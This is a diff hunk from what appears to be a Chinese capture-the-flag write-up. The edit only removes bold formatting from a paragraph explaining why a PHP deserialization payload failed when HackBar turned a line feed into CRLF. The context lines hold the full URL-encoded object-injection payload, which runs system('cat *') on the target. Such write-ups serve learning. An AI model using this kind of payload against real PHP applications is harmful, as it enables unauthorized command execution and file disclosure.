@@ -208,7 +208,7 @@ hackbar我用这个payload
 
 `cmd=O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+*%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`
 
-仔细看可以看出一些细微的差别，system前面变成了%0D%0A，多了个%0D，**%0D 是CR hackbar帮我补了回车，因此打不通，**hackbar使用raw的方式是不会补回车的，也可以成功打通，在群里和师傅们交流后发现，hackbar出错的原理的话应该是windows的换行符是0d0a，linux的换行符是0a，网站运行在linux机器上所以自然是把0a做成换行符，但是hackbar却补了0d0a，导致出错。
+仔细看可以看出一些细微的差别，system前面变成了%0D%0A，多了个%0D，%0D 是CR hackbar帮我补了回车，因此打不通，hackbar使用raw的方式是不会补回车的，也可以成功打通，在群里和师傅们交流后发现，hackbar出错的原理的话应该是windows的换行符是0d0a，linux的换行符是0a，网站运行在linux机器上所以自然是把0a做成换行符，但是hackbar却补了0d0a，导致出错。
 
 #### 我的payload问题出在哪了?
 
